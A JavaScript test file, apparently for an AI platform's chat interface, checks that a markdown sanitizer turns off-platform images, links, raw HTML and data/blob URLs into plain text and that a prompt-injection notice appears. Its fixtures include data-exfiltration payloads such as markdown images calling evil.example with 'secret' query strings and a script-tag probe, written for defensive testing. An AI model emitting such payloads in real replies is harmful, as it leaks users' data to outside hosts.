import { createRequire } from "node:module";
import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

const require = createRequire(import.meta.url);

function setPageUrl(href) {
  // jsdom 不實作跨來源導覽。改文件的 URL，window.location.hostname 才會跟著變。
  const { implForWrapper } = require("jsdom/lib/jsdom/living/generated/utils");
  const whatwgURL = require("whatwg-url");
  const document = implForWrapper(window.document);
  const url = whatwgURL.parseURL(href);
  const previous = whatwgURL.serializeURL(document._URL);
  document._URL = url;
  document._origin = whatwgURL.serializeURLOrigin(url);
  return previous;
}

import { MarkdownView } from "../markdown.jsx";
import { AuditWatermark, INJECTION_NOTICE } from "../trust.jsx";
import { neutralizeUntrustedMarkdown, isPlatformUrl } from "../runtime/untrustedOutput.js";

describe("外連改成純文字", () => {
  it("非平台網域的圖片與連結不可點、也不會變成 img", () => {
    const source = "看 ![x](http://evil.example/?q=secret) 與 [點此](http://evil.example/x)";
    const { container } = render(<MarkdownView text={source} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a[href*='evil.example']")).toBeNull();
    expect(container.textContent).toContain("evil.example");
  });

  it("平台相對路徑的圖片仍可載入", () => {
    const source = "![圖](/api/ingestion/images/3/blob)";
    const text = neutralizeUntrustedMarkdown(source);
    expect(text).toContain("/api/ingestion/images/3/blob");
    expect(text).toContain("![圖]");
    expect(isPlatformUrl("https://anila.ai.ncsist.org.tw/app")).toBe(true);
    expect(isPlatformUrl("http://evil.example/x")).toBe(false);
  });

  it("較長圍欄後面的圖片仍要改成純文字", () => {
    const source = "````\n```\ninside\n````\n![x](http://evil.example/?q=secret)";
    const text = neutralizeUntrustedMarkdown(source);
    expect(text).not.toContain("![x](");
    expect(text).toContain("evil.example");
    expect(text).toContain("inside");
  });

  it("原始 HTML、data 與 blob 不會變成可載入的網址", () => {
    const html = neutralizeUntrustedMarkdown(
      '<img src="//evil.example/?q=資料"> &#60;img src="//evil.example/?q=資料"&#62; ![x](data:image/png;base64,AAAA)',
    );
    expect(html.toLowerCase()).not.toContain("<img");
    expect(html).not.toContain("&#60;");
    expect(html).not.toContain("![x](");
    expect(isPlatformUrl("data:text/html,hi")).toBe(false);
    expect(isPlatformUrl("blob:https://evil.example/1")).toBe(false);
    const { container } = render(<MarkdownView text={'<img src="//evil.example/?q=資料">'} />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("頁面自己的主機算平台，別台的實驗 IP 不算", () => {
    const previous = setPageUrl("https://anila.intranet.example/anila/");
    try {
      expect(window.location.hostname).toBe("anila.intranet.example");
      expect(isPlatformUrl("https://anila.intranet.example/anila/")).toBe(true);
      expect(isPlatformUrl("http://ANILA.INTRANET.EXAMPLE/app")).toBe(true);
      expect(isPlatformUrl("/api/ingestion/images/3/blob")).toBe(true);
      expect(isPlatformUrl("https://anila.ai.ncsist.org.tw/app")).toBe(true);
      expect(isPlatformUrl("http://10.53.100.12/app")).toBe(false);
      expect(isPlatformUrl("http://10.53.100.15/app")).toBe(false);
      expect(isPlatformUrl("http://172.16.120.35/app")).toBe(false);
      expect(isPlatformUrl("http://172.16.120.153/app")).toBe(false);
      expect(isPlatformUrl("http://127.0.0.1/app")).toBe(false);
      expect(isPlatformUrl("http://evil.example/x")).toBe(false);
      const kept = neutralizeUntrustedMarkdown("![圖](https://anila.intranet.example/a.png)");
      expect(kept).toContain("![圖](https://anila.intranet.example/a.png)");
      const dropped = neutralizeUntrustedMarkdown("![x](http://10.53.100.12/a.png)");
      expect(dropped).not.toContain("![x](");
      expect(dropped).toContain("10.53.100.12");
    } finally {
      setPageUrl(previous);
    }
  });

  it("程式碼圍欄裡的網址留給預覽", () => {
    const source = "```html\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js\"></script>\n```";
    expect(neutralizeUntrustedMarkdown(source)).toContain("https://cdnjs.cloudflare.com");
  });
});

describe("回覆詳情", () => {
  it("疑似指令時顯示固定句子", () => {
    render(<AuditWatermark promptInjectionSuspected />);
    expect(screen.getByText("回覆詳情")).toBeTruthy();
    expect(screen.getByText(INJECTION_NOTICE)).toBeTruthy();
  });
});

describe("不是標籤開頭的小於號", () => {
  it("x < 5 與 y <= 3 原樣保留，<script 仍被擋", async () => {
    const { neutralizeUntrustedMarkdown } = await import("../runtime/untrustedOutput.js");
    const out = neutralizeUntrustedMarkdown("x < 5 且 y <= 3，<script>alert(1)</script>");
    expect(out).toContain("x < 5");
    expect(out).toContain("y <= 3");
    expect(out).not.toContain("<script");
  });
});
